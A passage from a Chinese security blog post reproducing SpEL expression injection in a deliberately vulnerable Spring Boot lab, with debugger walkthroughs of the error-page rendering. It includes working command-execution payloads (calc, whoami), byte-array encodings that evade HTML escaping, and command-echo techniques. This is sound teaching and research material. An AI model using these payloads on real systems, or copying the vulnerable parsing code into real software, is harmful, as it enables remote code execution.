class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SPEL<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>Tomcat</code>对<code>GET</code>请求中的 |{}等特殊字符存在限制(RFC 3986)，所以需要使用<code>POST</code>参数来传递</p><p><code>controller</code>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/index&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(String string)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SpelExpressionParser</span> <span class="variable">spelExpressionParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> spelExpressionParser.parseExpression(string);</span><br><span class="line">        <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> (String) expression.getValue();</span><br><span class="line">        out = out.concat(<span class="string">&quot; get&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于getValue中没有传入参数，所以会从默认容器，也就是spring容器：ApplicationContext中获取；如果给定了容器，则会向具体的容器中获取。简单的实验环境就搭起来了，然后试试常用的SpEL语法</p><blockquote><p>‘aaa’，表示字符串aaa</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220319181545.png"></p><p>在SPEL语法中，表达式有这些用法</p><h3 id="用法一-T-类名"><a href="#用法一-T-类名" class="headerlink" title="用法一  T(类名)"></a>用法一  T(类名)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(类名)，可以指定使用一个类的类方法</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220319184426.png"></p><p>这里后端会执行语句，然后由于类型转换问题出现报错，所以没有返回值，springboot抛出空白页和500，但是计算器依然弹出。</p><h3 id="用法二-new-类名"><a href="#用法二-new-类名" class="headerlink" title="用法二 (new 类名)"></a>用法二 (new 类名)</h3><p>new 类名,可以直接new一个对象，再执行其中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>).start()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220319185829.png"></p><blockquote><p> 这里为什么不用<code>Runtime()</code>呢，因为<code>Runtime()</code>是单例类，不能直接被<code>new</code>出来</p></blockquote><p>可见直接new一个对象执行其中的方法，杀伤力极大！需要注意的是，类名最好用全限类名，也就是具体到某个包，不然会因为找不到具体类而报错。</p><h3 id="用法三-…-x2F-…"><a href="#用法三-…-x2F-…" class="headerlink" title="用法三 (#{…}&#x2F;${…})"></a>用法三 (#{…}&#x2F;${…})</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;…&#125; 用于执行SpEl表达式，并将内容赋值给属性</span><br><span class="line">$&#123;…&#125; 主要用于加载外部属性文件中的值</span><br></pre></td></tr></table></figure><p>两者还可以混合使用，但需要注意的是{}中的内容必须符合SpEL表达式。这里需要换一下SpEL的写法，否则会因为没有使用模板解析表达式，在传入#{后出现报错。</p><p>这里更换以下<code>controller</code>的写法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.common.TemplateParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/index&quot;,params = &quot;string&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(String string)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SpelExpressionParser</span> <span class="variable">spelExpressionParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">TemplateParserContext</span> <span class="variable">templateParserContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> spelExpressionParser.parseExpression(string,templateParserContext);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">out</span> <span class="operator">=</span> (Integer) expression.getValue();</span><br><span class="line">        <span class="keyword">return</span> Integer.toString(out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在经过<code>TemplateParserContext</code>的解析后，以上两种方式被严格限制</p><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220319191121.png"></p><h2 id="IllegalStateException复现"><a href="#IllegalStateException复现" class="headerlink" title="IllegalStateException复现"></a>IllegalStateException复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/index&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(String string)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后启动springboot 项目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，我们输入<code>$&#123;7*7&#125;</code>，看到其进行一个解析</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320172712.png"></p><p>之后输入<code>payload</code>：<code>$&#123;new java.lang.ProcessBuilder(&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;).start()&#125;</code>，发现其无法执行命令。</p><p>更换<code>payload</code>为：<code>string=$&#123;new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()&#125;</code>才可以执行命令。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320175026.png"></p><p>其中报错调用堆栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.expression.spel.SpelParseException: EL1069E:(pos <span class="number">29</span>): missing expected character <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">at org.springframework.expression.spel.standard.Tokenizer.process(Tokenizer.java:<span class="number">186</span>) ~[spring-expression-<span class="number">4.2</span><span class="number">.3</span>.RELEASE.jar:<span class="number">4.2</span><span class="number">.3</span>.RELEASE]</span><br><span class="line">at org.springframework.expression.spel.standard.Tokenizer.&lt;init&gt;(Tokenizer.java:<span class="number">84</span>) ~[spring-expression-<span class="number">4.2</span><span class="number">.3</span>.RELEASE.jar:<span class="number">4.2</span><span class="number">.3</span>.RELEASE]</span><br><span class="line">at org.springframework.expression.spel.standard.InternalSpelExpressionParser.doParseExpression(InternalSpelExpressionParser.java:<span class="number">121</span>) ~[spring-expression-<span class="number">4.2</span><span class="number">.3</span>.RELEASE.jar:<span class="number">4.2</span><span class="number">.3</span>.RELEASE]</span><br><span class="line">at org.springframework.expression.spel.standard.SpelExpressionParser.doParseExpression(SpelExpressionParser.java:<span class="number">60</span>) ~[spring-expression-<span class="number">4.2</span><span class="number">.3</span>.RELEASE.jar:<span class="number">4.2</span><span class="number">.3</span>.RELEASE]</span><br></pre></td></tr></table></figure><p>调试一下，看一下为什么：</p><p>此时调用堆栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:<span class="number">959</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">893</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">970</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doPost:<span class="number">872</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">648</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">846</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">729</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">291</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">206</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">720</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">processRequest:<span class="number">468</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">doForward:<span class="number">391</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">forward:<span class="number">318</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">custom:<span class="number">439</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">status:<span class="number">305</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">throwable:<span class="number">399</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">180</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">79</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">88</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">518</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:<span class="number">1091</span>, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">673</span>, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1500</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">1456</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320193853.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br></pre></td></tr></table></figure><p>方法中处理了相关的HTTP请求，相关的控制器方法执行和触发的异常都是在这里面执行的</p><p>这时，继续往下走，经过<code>manager</code>处理后，<code>view</code>试图会是<code>error</code>类型</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320194037.png"></p><p>到目前modeView对象已经拿到了，该对象中包含了这里HTTP请求处理的处理和相关值，然后将这个作为参数调用processDispatchResult，让该方法来进行渲染</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320194309.png"></p><p>在processDispatchResult方法中就会进行渲染，其中实现渲染的方法名就是render<br><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320194612.png"></p><p>此时的调用堆栈为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">render:<span class="number">1244</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processDispatchResult:<span class="number">1027</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:<span class="number">971</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">893</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">970</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doPost:<span class="number">872</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">648</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">846</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">729</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">291</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">206</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">720</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">processRequest:<span class="number">468</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">doForward:<span class="number">391</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">forward:<span class="number">318</span>, ApplicationDispatcher (org.apache.catalina.core)</span><br><span class="line">custom:<span class="number">439</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">status:<span class="number">305</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">throwable:<span class="number">399</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">180</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">79</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">88</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">518</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:<span class="number">1091</span>, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">673</span>, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1500</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">1456</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>之后模板开始渲染</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320194816.png"></p><p>用的是什么解析器来进行渲染呢？SpELPlaceholderResolver对象</p><p>渲染的模板就是默认的Whitelabel Error Page 模板，其中就四个标签有进行相关SpEL表达式的操作的，分别是 ${timestamp} ${error} ${status} ${message}</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320194920.png"></p><p>继续跟进<code>parseStringValue</code>方法，简单说一下流程</p><ol><li><p>StringBuilder result &#x3D; new StringBuilder(strVal); 将要渲染的模板存储到一块StringBuilder对象中</p></li><li><p>接着下面的while循环就是来寻找 this.placeholderPrefix开头并且以this.placeholderSuffix 结尾的字符串，并且将其中的字符串名称取出</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320200737.png"></p></li><li><p>这时候就来到了 placeholder &#x3D; parseStringValue(placeholder, placeholderResolver, visitedPlaceholders); ，它会将 上面取出来的字符串作为placeholder变量进行传输，通过placeholderResolver解析器来进行解析，而且这个方法还是递归的方法，因为上面一开始取出的字符串中还带有<code>$&#123; &#125;</code>这种，还会递归进行parseStringValue解析，直到不存在<code>$&#123;&#125;为止</code></p></li><li><p>String propVal &#x3D; placeholderResolver.resolvePlaceholder(placeholder);，接着就是调用这个方法，这个方法才是真正的主角，因为进行字符串填充的都是通过这个方法。<code>resolvePlaceholder</code>这个方法跟进去，可以发现会通过SpelExpressionParser对象的parseExpression方法来对传入的字符串进行保存，最后返回一个expression的对象</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320201116.png"></p><ol start="5"><li><p><code>Object value = expression.getValue(this.context);</code> 接着其中继续通过返回来的expression对象来获取其中的值，根据该值来判断返回对应的对象，这里传入的是<code>timestamp</code>，通过getValue方法之后返回出来的是一个Date格式的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320201555.png"></p></li><li><p>继续对返回的字符串进行HTML编码处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> HtmlUtils.htmlEscape(value == <span class="literal">null</span> ? <span class="literal">null</span> : value.toString());</span><br></pre></td></tr></table></figure></li><li><p>最后进行替换处理，将其解析出来的字符串和对应的<code>$&#123;&#125;</code>进行替换</p></li></ol><p>   <img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320201816.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320213247.png"></p><p>此时，经过渲染，我们的输入，已经被转义掉了，HTML编码处理了，最后返回的字符串存在<code>&amp;</code>，为了避免转义，我们只能用16进制。</p><h2 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h2><ol><li><p>当存在时，使用commons-io组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())</span><br></pre></td></tr></table></figure></li><li><p>使用jdk&gt;&#x3D;9中的JShell，这种方式会受限于jdk的版本问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;whatever java code in one statement&#x27;</span>).toString()</span><br></pre></td></tr></table></figure></li><li><p>原生输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;whoami&quot;</span>).start().getInputStream(), <span class="string">&quot;gbk&quot;</span>)).readLine()</span><br></pre></td></tr></table></figure><p>经过编码后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,<span class="number">0x64</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x63</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x77</span>,<span class="number">0x68</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,<span class="number">0x6d</span>,<span class="number">0x69</span>,<span class="number">0x22</span>&#125;)).start().getInputStream())).readLine()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220320231612.png"></p></li><li><p>Scanner</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title 